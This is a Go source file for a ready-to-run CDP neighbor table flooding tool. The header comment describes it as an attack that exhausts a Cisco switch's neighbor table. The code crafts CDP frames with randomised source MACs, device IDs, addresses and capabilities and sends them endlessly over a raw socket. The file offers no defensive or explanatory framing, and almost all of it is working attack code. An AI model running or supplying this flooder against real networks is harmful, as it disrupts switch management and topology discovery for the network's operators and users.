// Package cdpflood implements a CDP neighbor table overflow attack.
//
// Cisco switches maintain a CDP neighbor table with a fixed capacity.  By
// flooding with frames that each carry a unique Device ID TLV and a random
// source MAC, we exhaust the table so the switch can no longer track legitimate
// neighbors, disrupting network topology discovery and management.
//
// Each frame is an IEEE 802.3 frame with LLC/SNAP encapsulation (the native
// CDP framing on Cisco gear):
//
//	dst  01:00:0C:CC:CC:CC  (CDP multicast)
//	src  random unicast MAC
//	LLC  AA AA 03
//	SNAP 00:00:0C / 0x2000  (Cisco / CDP)
//	CDP  version=2 TTL=255 checksum TLVs...
//
// Per-packet randomisation:
//
//	source MAC  — random unicast
//	Device ID   — 8 random printable characters
//	Address TLV — random IPv4
//	Capability  — random uint32
package cdpflood

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"sync/atomic"
	"time"
)

const (
	cdpFloodTag = "\x1b[34m[CDP]\x1b[0m"

	cdpVer = byte(0x02)
	cdpTTL = byte(0xFF)

	tlvDeviceID     = uint16(0x0001)
	tlvAddresses    = uint16(0x0002)
	tlvPortID       = uint16(0x0003)
	tlvCapabilities = uint16(0x0004)
	tlvSoftwareVer  = uint16(0x0005)
	tlvPlatform     = uint16(0x0006)
)

var cdpDst = [6]byte{0x01, 0x00, 0x0C, 0xCC, 0xCC, 0xCC}

// rawSocket is satisfied by the platform-specific AF_PACKET implementation.
type rawSocket interface {
	Send(frame []byte) error
	Close() error
}

// Flooder performs the CDP neighbor table overflow.
type Flooder struct {
	Interface string
	Rate      int // target pps; 0 = full hardware speed
}

// Run opens a raw socket and floods until Ctrl+C.
func (f *Flooder) Run() error {
	iface, err := net.InterfaceByName(f.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", f.Interface, err)
	}

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	var total int64

	// Ctrl+C → print final tally and exit.
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Stopped. Total frames sent: %d\n", cdpFloodTag, atomic.LoadInt64(&total))
		os.Exit(0)
	}()

	// Live throughput line, updated every second.
	go func() {
		t := time.NewTicker(time.Second)
		defer t.Stop()
		var prev int64
		for range t.C {
			cur := atomic.LoadInt64(&total)
			fmt.Printf("\r%s Total: %-12d  Rate: %-8d pps    ", cdpFloodTag, cur, cur-prev)
			prev = cur
		}
	}()

	if f.Rate > 0 {
		fmt.Printf("%s Flooding CDP neighbor table on %s at %d pps — press Ctrl+C to stop.\n", cdpFloodTag, f.Interface, f.Rate)
	} else {
		fmt.Printf("%s Flooding CDP neighbor table on %s at full speed — press Ctrl+C to stop.\n", cdpFloodTag, f.Interface)
	}

	var interval time.Duration
	if f.Rate > 0 {
		interval = time.Second / time.Duration(f.Rate)
	}
	next := time.Now()

	for {
		if f.Rate > 0 {
			if now := time.Now(); now.Before(next) {
				time.Sleep(next.Sub(now))
			}
			next = next.Add(interval)
		}
		_ = sock.Send(buildFrame())
		atomic.AddInt64(&total, 1)
	}
}

// buildFrame assembles one CDP-in-802.3 frame with randomised per-packet fields.
//
// Wire layout:
//
//	[0:6]   802.3 dst  01:00:0C:CC:CC:CC  (CDP multicast)
//	[6:12]  802.3 src  random unicast MAC
//	[12:14] 802.3 length (= payloadLen)
//	[14:17] LLC  DSAP=0xAA SSAP=0xAA Ctrl=0x03
//	[17:22] SNAP OUI=00:00:0C PID=0x2000
//	[22:23] CDP version = 0x02
//	[23:24] CDP TTL    = 0xFF
//	[24:26] CDP checksum (one's complement over bytes [22:end])
//	[26:]   TLVs: Device-ID, Address, Port-ID, Capabilities, SW-Version, Platform
func buildFrame() []byte {
	srcMAC := randMAC()
	devID := randDevID()
	ip := randIPv4()
	caps := randU32()

	// Assemble TLVs.
	var tlvs []byte
	tlvs = append(tlvs, tlvString(tlvDeviceID, devID)...)
	tlvs = append(tlvs, tlvAddress(ip)...)
	tlvs = append(tlvs, tlvString(tlvPortID, "GigabitEthernet0/1")...)
	tlvs = append(tlvs, tlvCaps(caps)...)
	tlvs = append(tlvs, tlvString(tlvSoftwareVer, "Cisco IOS Software, Version 12.2(58)SE2, RELEASE SOFTWARE (fc1)")...)
	tlvs = append(tlvs, tlvString(tlvPlatform, "cisco WS-C3750G-24TS")...)

	// CDP PDU: version(1) + TTL(1) + checksum(2, zero for computation) + TLVs.
	cdpPDU := make([]byte, 4+len(tlvs))
	cdpPDU[0] = cdpVer
	cdpPDU[1] = cdpTTL
	copy(cdpPDU[4:], tlvs)
	binary.BigEndian.PutUint16(cdpPDU[2:4], cdpChecksum(cdpPDU))

	// LLC (3 bytes) + SNAP (5 bytes).
	llcsnap := [8]byte{0xAA, 0xAA, 0x03, 0x00, 0x00, 0x0C, 0x20, 0x00}

	payloadLen := len(llcsnap) + len(cdpPDU)
	frame := make([]byte, 14+payloadLen)

	// IEEE 802.3 header.
	copy(frame[0:6], cdpDst[:])
	copy(frame[6:12], srcMAC[:])
	binary.BigEndian.PutUint16(frame[12:14], uint16(payloadLen))

	copy(frame[14:22], llcsnap[:])
	copy(frame[22:], cdpPDU)

	return frame
}

// tlvString builds a TLV whose value is an ASCII string.
func tlvString(t uint16, s string) []byte {
	b := make([]byte, 4+len(s))
	binary.BigEndian.PutUint16(b[0:2], t)
	binary.BigEndian.PutUint16(b[2:4], uint16(4+len(s)))
	copy(b[4:], s)
	return b
}

// tlvAddress builds a CDP Address TLV carrying one IPv4 address.
//
// Layout (17 bytes total):
//
//	type(2) + len(2) + numAddrs(4) + protoType(1) + protoLen(1) + proto(1) + addrLen(2) + ip(4)
func tlvAddress(ip [4]byte) []byte {
	b := make([]byte, 17)
	binary.BigEndian.PutUint16(b[0:2], tlvAddresses)
	binary.BigEndian.PutUint16(b[2:4], 17)
	binary.BigEndian.PutUint32(b[4:8], 1)   // number of addresses = 1
	b[8] = 0x01                              // NLPID protocol type
	b[9] = 0x01                              // protocol length = 1
	b[10] = 0xCC                             // 0xCC = IP (NLPID for IPv4)
	binary.BigEndian.PutUint16(b[11:13], 4)  // address length = 4
	copy(b[13:17], ip[:])
	return b
}

// tlvCaps builds a Capabilities TLV (8 bytes total).
func tlvCaps(caps uint32) []byte {
	b := make([]byte, 8)
	binary.BigEndian.PutUint16(b[0:2], tlvCapabilities)
	binary.BigEndian.PutUint16(b[2:4], 8)
	binary.BigEndian.PutUint32(b[4:8], caps)
	return b
}

// cdpChecksum computes the RFC 1071 one's complement checksum over the CDP PDU.
// The checksum field must be zeroed before calling.
func cdpChecksum(data []byte) uint16 {
	var sum uint32
	for i := 0; i+1 < len(data); i += 2 {
		sum += uint32(binary.BigEndian.Uint16(data[i : i+2]))
	}
	if len(data)%2 == 1 {
		sum += uint32(data[len(data)-1]) << 8
	}
	for sum>>16 != 0 {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

// randMAC returns a random locally-administered unicast MAC (I/G bit = 0).
func randMAC() [6]byte {
	var m [6]byte
	rand.Read(m[:])
	m[0] = (m[0] & 0xFE) | 0x02 // clear I/G (unicast), set U/L (locally administered)
	return m
}

func randIPv4() [4]byte {
	var ip [4]byte
	rand.Read(ip[:])
	return ip
}

func randU32() uint32 {
	var b [4]byte
	rand.Read(b[:])
	return binary.BigEndian.Uint32(b[:])
}

// randDevID returns 8 random printable characters used as the CDP Device ID.
// Each unique Device ID forces the switch to create a new neighbor table entry.
func randDevID() string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	var rb [8]byte
	rand.Read(rb[:])
	b := make([]byte, 8)
	for i := range b {
		b[i] = charset[int(rb[i])%len(charset)]
	}
	return string(b)
}
